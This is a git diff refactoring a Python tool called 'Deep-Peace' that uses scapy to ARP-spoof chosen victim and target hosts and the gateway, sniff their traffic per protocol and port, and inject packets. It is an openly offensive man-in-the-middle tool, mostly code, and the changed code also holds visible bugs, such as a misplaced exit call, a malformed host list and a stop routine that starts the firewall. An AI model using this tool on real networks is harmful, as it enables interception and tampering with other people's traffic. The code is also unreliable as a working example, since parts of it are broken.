@@ -9,8 +9,7 @@ import os
 import re
 import time
 import scapy.all as scapy
-from lib import logger as liblog, sniffer as sniff
-from lib.spoofing import Spoofer
+from lib import logger as liblog
 
 # Regex for checking mac address
 r_mac = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
@@ -21,16 +20,27 @@ r_port = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9
 
 targets = 0
 log	 = None
+host = None
 
 class Target:
-	name		= ""
-	ip		  = ""
-	mac		 = ""
-	valid	   = False
-	def get_mac(self, ip) -> bool:
+	name	= ""
+	ip		= ""
+	mac		= ""
+	valid	= False
+	victims = set()
+
+	def __init__(self, ip, name):
+		global targets, host
+		self.name   = name
+		self.ip	 = ip
+		if host is not None and self.ip == host[0]:
+			self.mac = host[1]
+		targets	 = targets + 1
+
+	def get_mac(self) -> bool:
 		global r_mac
 		# ARP request
-		req = scapy.ARP(pdst=ip)
+		req = scapy.ARP(pdst=self.ip)
 		# Broadcast Ethernet layer
 		brd = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 		# Build the packet
@@ -38,126 +48,160 @@ class Target:
 		# Wait for the response (2 seconds)
 		res = scapy.srp(arp_req, timeout=2, verbose=False)[0]
 		# getting the MAC
-		#self.mac = res[0].hwsrc
 		if len(res) == 0:
-			log.error("host with ip {} seems to not be online.".format(ip))
+			log.error("host with ip {} seems to be offline.".format(self.ip))
 		elif r_mac.match(res[0][1].hwsrc):
 			self.valid = True
 			self.mac = res[0][1].hwsrc
 		return self.valid
 
-	def __init__(self, ip, name):
-		global r_iadr, r_mac, targets
-		if len(name) == 0:
-			name = "target"+str(targets)
-		log.debug("new target {} with ip: {}".format(name, ip))
-		if r_iadr.match(ip):
-			self.name   = name
-			self.ip	 = ip
-			targets	 = targets + 1
-			if not self.get_mac(self.ip):
-				log.error("failed to get mac address for {}".format(name))
-			else:
-				log.print("new target defined with name {} and ip {}".format(name, ip))
-		else: log.print("bad ip address for target {} got: {}".format(name, ip))
-
 # Dynamic Protocol Injector Sniffer (called Deep-Peace)
+# TODO: Firewall, StdIn, Socket
 class DPIS:
-	# define our instance variables
-#   logger	  = None
-	sniffer	 = None
-	spoofer	 = None
-	firewall	= None
-	protocol	= []
-
 	# host interface we're listening to
-	iface	   = ""
+	iface		= ""
 	# host informations [ip, mac]
 	host		= ["", ""]
-	# protocol informations [[name, port]
-	protoinfo   = []
+	victims		= set()
+	targets		= set()
 	# gateway informations Target(gateway)
-	gateway	 = None
-	# targets List[Target(), ...]
-	targets	 = []
-	# victims List[Target(), ...]
-	victims	 = []
+	gateway		= None
 	# toggle stdin for incoming datas
-	stdin	   = False
+	stdin		= False
 	# enable socket to intercept datas
-	socket	  = None
-	def __init__(self, iface, proto, target, victim, spoof = False, firewall = False):
-		global r_port, log;
-		self.iface	  = iface
-		self.host	   = [scapy.get_if_addr(iface), scapy.get_if_hwaddr(iface)]
-		log.print("current host informations:\n\tinterface:\t{}\n\tip:\t\t{}\n\tmac:\t\t{}".format(iface, self.host[0], self.host[1]))
+	socket		= None
+	# define our instance variables
+	sniffer		= None
+	spoofer		= None
+	firewall	= None
+	protocol	= []
+	def __init__(self, proto, stdin, victims, targets, spoofing, firewall):
+		from lib import sniffer as sniff, spoofing as spoof, firewall as fw
+		global log, host;
+		self.host		= host
 		# we detect the gateway for the current interface
 		for route in scapy.conf.route.routes:
-			if iface in route and route[4] == '0.0.0.0':
+			if host[2] in route and route[4] == '0.0.0.0':
 				self.gateway	= Target(route[2], 'gateway')
 				break;
 			else:
-				self.gateway	= scapy.conf.route.route('0.0.0.0')[2]
+				self.gateway	= Target(scapy.conf.route.route('0.0.0.0')[2], 'gateway')
 				break;
-		# creation of every Target object class
-		for t in target:
-			if isinstance(t, list):
-				self.targets.append(Target(t[0], "" if t[1] is None or len(t[1]) == 0 else t[1]))
-			else: self.targets.append(Target(t, ""))
-		for v in victim:
-			if isinstance(v, list):
-				self.victims.append(Target(v[0], "" if v[1] is None or len(v[1]) == 0 else v[1]))
-			else: self.victims.append(Target(v, ""))
+		# should be always at the beginning and after host initialisation
+		if spoofing:
+			self.spoofer	= spoof.Spoofer(self.host, 1)
+		sniff_filter	= f""
+		p_targets		= []
+		p_victims		= []
+		routes			= []
+		# this part initialize every required protocols
+		# also it setup sniffer filter, and create router to protocol function
 		try:
-			# If multiple protocol was specified, load and initialize every protocol
-			if not isinstance(proto[0], list):
-				proto = [proto]
+			i = 0
 			for p in proto:
-				# Split the port argument into protocol_name and port
-				p = p.split(':')
-				# Make sure port format is correct
-				if not r_port.match(p[1]):
-					log.error("Invalid target port!")
-					sys.exit(2)
-				self.protoinfo.append(p);
-				self.protocol.append(importlib.import_module("lib.proto."+p[0]).Protocol(
-					self.host, self.victims, self.targets, self.gateway, self.stdin
-				))
+				_proto = None
+				_f = f""
+				if len(sniff_filter) != 0:
+					_f = _f + f" or "
+				if p is None or not isinstance(p, list):
+					log.error("tried to initialize protocol number {} but argument is invalid".format(i))
+				elif len(p) == 2:
+					_proto = importlib.import_module("lib.proto."+p[0]).Protocol(
+						self.host, stdin, victims, targets, self.gateway
+					)
+					hosts = "and ".join("host "+t.ip for t in (victims + targets))
+					self.protocol.append(_proto)
+				elif len(p) == 4:
+					_proto = importlib.import_module("lib.proto."+p[0]).Protocol(
+						self.host, stdin, p[2], p[3], self.gateway
+					)
+					hosts = "and ".join("host "+t.ip for t in (p[2] + [3]))
+					self.protocol.append(_proto)
+					p_victims = p_victims + p[2]
+					p_targets = p_targets + p[3]
+					for v in p[2]:
+						if not v in self.victims:
+							self.victims.add(v)
+						for t in p[3]:
+							if not v in t.victims and (t.valid or t.get_mac()):
+								if spoofing: self.spoofer.spoof(v, t)
+								t.victims.add(v)
+					for t in p[3]:
+						if not t in self.targets:
+							self.targets.add(t)
+						for v in p[2]:
+							if not t in v.victims and (v.valid or v.get_mac()):
+								if spoofing: self.spoofer.spoof(t, v)
+								v.victims.add(t)
+				_f = _f + f"{_proto.events.protocol} port {p[1]} and ({hosts})"
+				log.debug("{} protocol successfully initialized.".format(p[0]))
+				def route(dport, sport, pkt) -> None:
+					if dport == p[1] or sport == p[1]:
+						_proto.events.add_queue(pkt);
+				route.layer = _proto.events.protocol
+				routes.append(route)
 		except (Exception or RecursionError or ReferenceError) as E:
-			log.debug(E)
+			log.error(E)
 			sys.exit(2)
-		log.debug("protocol {} selected on port {}".format(self.protoinfo[0][0], self.protoinfo[0][1]))
-		if firewall:
-			self.firewall = firewall
-		if spoof:
-			self.spoofer = Spoofer(self.host, 1)
-			for victim in self.victims:
-				self.spoofer.spoof(victim, self.gateway)
-				for target in self.targets:
-					self.spoofer.spoof(victim, target)
-			for target in self.targets:
-				self.spoofer.spoof(target, self.gateway)
-				for victim in self.victims:
-					self.spoofer.spoof(target, victim)
-		log.debug(self.protocol)
-		self.sniffer = sniff.sniffer(
-			self.victims[0],
-			self.targets[0],
-			self.iface,
-			self.protoinfo[0][1],
-			self.protocol[0]
+		for v in p_victims:
+			i = 0;
+			while i < len(victims):
+				if victims[i].ip == v.ip:
+					victims[i] = v
+					if not v in self.victims:
+						self.victims.add(v)
+				elif not victims[i] in self.victims: self.victims.add(victims[i])
+		for t in p_targets:
+			i = 0;
+			while i < len(targets):
+				if targets[i].ip == t.ip:
+					targets[i] = t
+					if not t in self.targets:
+						self.targets.add(t)
+				elif not targets[i] in self.targets: self.targets.add(targets[i])
+		self.sniffer = sniff.Sniffer(
+			host[2],
+			routes,
+			sniff_filter,
+			",".join(str(p[1]) for p in proto)
 		)
+		for v in victims:
+			if not v in self.victims:
+				self.victims.add(v)
+			for t in targets:
+				if not v in t.victims and (t.valid or t.get_mac()):
+					if spoofing: self.spoofer.spoof(v, t)
+					t.victims.add(v)
+		for t in targets:
+			if not t in self.targets:
+				self.targets.add(t)
+			for v in victims:
+				if not t in v.victims and v.valid or v.get_mac():
+					if spoofing: self.spoofer.spoof(t, v)
+					v.victims.add(t)
+
+		# TODO: Firewall
+
+		# should be always at the end.
+		log.print("current host informations:\n\tinterface:\t{}\n\tip:\t\t{}\n\tmac:\t\t{}\n\tgateway:\t{}\n\ttargets:\t{}\n\tvictims:\t{}\n\tprotocols:\t{}".format(
+			host[2],
+			host[0],
+			host[1],
+			self.gateway.ip,
+			",".join(t.ip for t in self.victims),
+			",".join(t.ip for t in self.targets),
+			",".join(" on port ".join([p[0], str(p[1])]) for p in proto)))
 
 	# Start instances and threads.
 	def start(self) -> bool:
 		global log
-		self.protocol.start()
-		if self.firewall is not None:
-			log.print("Enabling firewall rules...")
 		if self.spoofer is not None:
-			log.print("Starting spoofer, please wait for a while...")
 			self.spoofer.start()
-		log.print("Sniffing on port {}".format(self.proto[1]))
+		if self.firewall is not None:
+			self.firewall.start()
+		for p in self.protocol:
+			p.start()
+		# should be always at the end.
 		self.sniffer.start()
 
 	# Stop threads and exit program.
@@ -167,8 +211,10 @@ class DPIS:
 		self.sniffer.stop()
 		if self.spoofer is not None:
 			self.spoofer.stop()
-		if self.protocol is not None:
-			self.protocol.stop()
+		if self.firewall is not None:
+			self.firewall.start()
+		for p in self.protocol:
+			p.stop()
 		sys.exit(0)
 
 	# Execute readline for specified protocol.
@@ -178,7 +224,7 @@ class DPIS:
 # Main function, parses every arguments and return dyn class
 def main() -> DPIS:
 	# import global settings(get all Var)
-	global log, r_iadr
+	global log, r_iadr, host
 	print("""
 \x1b[1;92m      :::::::::  ::::::::: ::::::::::: :::::::: 
 \x1b[0;92m     :+:    :+: :+:    :+:    :+:    :+:    :+: 
@@ -190,22 +236,6 @@ def main() -> DPIS:
 
 	Dynamic Protocols Injection and Spoofing
 	(called Deep-Peace)""")
-	#if platform.system() == "Windows":
-	#	try:
-	#		import pyuac
-	#	#	if not pyuac.isUserAdmin():
-	#	#		print("\x1b[0;31;40mThis program should be run as Administrator.\x1b[0m")
-	#	#		#rc = pyuac.runAsAdmin()
-	#	#		exit(1)
-	#	except Exception as E:
-	#		if type(E.args[0]) == str and "No module" in E.args[0]:
-	#			module = E.args[0].split(' ')
-	#			if "win32con" in module:
-	#				module = "'pypiwin32'"
-	#			print("\x1b[0;31;40mShould install {} on windows platform.\x1b[0m".format(module[len(module) - 1]))
-	#		else:
-	#			print(E)
-	#		exit(1)
 	# Make sure the script is being run as root
 	if platform.system() != "Windows" and os.geteuid() != 0:
 		print("\x1b[0;31;40mThis program should be run as root.\x1b[0m")
@@ -246,11 +276,11 @@ def main() -> DPIS:
 	#Argument for the network interface listener
 	parser.add_argument("iface", help="Set interface listening to")
 	#Arguement for the port destination
-	parser.add_argument("protocol", help="Define the protocol and port <name>:<port>")
+	parser.add_argument("protocol", help="Define the protocol and port <name>:<port>[:<victim_ip>:<target_ip>[,<name>:<port>[:...]]]")
 	#Argument for the ip source
-	parser.add_argument("target", help="List of targets ip address (most of cases server ip address)\n\t\t<target>[,<target>[,...]]")
+	parser.add_argument("victim", help="List of victims ip address\n\t\t<ip>[,<ip>[,...]]")
 	#Argument for the ip source
-	parser.add_argument("victim", help="List of victims ip address\n\t\t<victim>[,<victim>[,...]]")
+	parser.add_argument("target", help="List of targets ip address (most of cases server ip address)\n\t\t<ip>[,<ip>[,...]]")
 
 	# parse command-line argument
 	args = parser.parse_args()
@@ -265,44 +295,17 @@ def main() -> DPIS:
 		if not args.iface in ifaces:
 			log.error("Interface {} doesn't exist or isn't working. printing valid interfaces:\n\t{}".format(args.iface, ifaces))
 			exit(1)
-
-	if not ":" in args.protocol:
-		log.error("Bad argument for <protocol> should specify <name>:<port>[, <name>:<port>]")
-		exit(1)
-
-	if len(args.target) == 0:
-		log.error("Bad argument for <target>")
-		exit(1)
-	elif ',' in args.target:
-		args.target = args.target.split(',');
-	else:
-		args.target = [args.target]
-	i = 0
-	for t in args.target:
-		if not r_iadr.match(t):
-			log.error("Bad <target> number {} got {}".format(str(i), t))
-			exit(1)
-		i = i + 1
-
-	if len(args.victim) == 0:
-		log.error("Bad argument for <victim>")
-		exit(1)
-	elif "," in args.victim:
-		args.victim = args.victim.split(",")
-	else:
-		args.victim = [args.victim]
-	i = 0
-	for v in args.victim:
-		if not r_iadr.match(v):
-			log.error("Bad <victim> number {} got {}".format(str(i), v))
-			exit(1)
-		i = i + 1
+	host = [scapy.get_if_addr(args.iface), scapy.get_if_hwaddr(args.iface), args.iface]
+	
+	args.protocol	= parse_vargs(args.protocol,	"protocol",	":", ";",	parse_proto)
+	args.target		= parse_vargs(args.target,		"target",	":", None,	parse_target)[0]
+	args.victim		= parse_vargs(args.victim,		"victim",	":", None,	parse_target)[0]
 
 	return DPIS(
-		args.iface,
 		args.protocol,
-		args.target,
+		args.stdin,
 		args.victim,
+		args.target,
 		args.spoofing,
 		args.firewall
 	);
@@ -312,11 +315,89 @@ def main() -> DPIS:
 		ready = lpkt.psh(payload)
 		lpkt.send(ready)
 
+def parse_target(arg, name = "") -> list | None:
+	length = len(arg)
+	if length == 0:
+		log.error("Should specify a {} got empty value".format(name))
+		sys.exit(1)
+	i = 0
+	while i < length:
+		if not r_iadr.match(arg[i]):
+			log.error("Bad format for {} number {}, should be an ip address got: {}".format(name, i, arg[i]))
+			sys.exit(1)
+		arg[i] = Target(arg[i], name + str(i))
+		i = i + 1
+	return arg
+
+def parse_proto(arg, name = "") -> list | None:
+	# simple protocol definition:		name, port
+	# protocol with victim and target:	name, port, victim, target
+	length = len(arg)
+	if length == 2 or length == 4:
+		if len(arg[0]) == 0 or not isinstance(arg[0], str):
+			log.print("bad format for name part of protocol argument:\n\t\tgot: {}".format(arg[0]))
+			sys.exit(1)
+	else:
+		log.print("bad protocol argument.")
+		sys.exit(1)
+	try:
+		float(arg[1])
+	except ValueError:
+		return None
+	else:
+		if not float(arg[1]).is_integer():
+			log.print("at position 2 for protocol argument expected int got {}".format(type(arg[i])))
+			sys.exit(1)
+		elif not r_port.match(arg[1]):
+			log.error("specified port for protocol {} is invalid".format(arg[0]))
+			sys.exit(1)
+		arg[1] = int(arg[1])
+	i = 2
+	while i < length:
+		if "," in arg[i]:
+			arg[i] = arg[i].split(',')
+		else: arg[i] = [arg[i]]
+		j = 0
+		for ip in arg[i]:
+			if not r_iadr.match(ip):
+				log.print("at position {} for protocol argument expected an ip address got {}".format(ip))
+			sys.exit(1)
+			arg[i][j] = Target(ip, arg[0]+"_target"+j if i == length - 1 else arg[0]+"_victim"+j)
+			j = j + 1
+		i = i + 1
+	return arg
+
+# parse a variable argument into a list.
+# name is just a string to identify the argument
+# sep is an argument delimiter
+# split is a variable length delimiter
+def parse_vargs(arg, name, sep = ":", split = ",", callback = None) -> list:
+	_arg = []
+	# detect if variable length
+	if split is not None and split in arg:
+		arg = arg.split(split)
+		if len(arg[0]) == 0 or len(arg[1]) == 0:
+			log.error("Bad format for argument {} got: {}".format(name, arg[0]) + split + "{}".format(arg[1]))
+			log.error("maybe one side of the argument is incorrect.")
+			sys.exit(1)
+	# else convert to a simple list
+	else: arg = [arg]
+	for va in arg:
+		# detect format splitter
+		if sep in va:
+			va = va.split(sep)
+		if not isinstance(va, list):
+			va = [va]
+		if callback is not None:
+			_arg.append(callback(va, name))
+		else: _arg.append(va)
+	return _arg;
+
 if __name__ == "__main__":
 	if platform.system() == "Windows":
 		time.sleep(4)
 	# Call the main fonction
 	program = main()
 	# Catch interrupt signal and run exit functions
-	signal.signal(signal.SIGINT, program.exit)
+	signal.signal(signal.SIGINT, program.stop)
 	program.start()
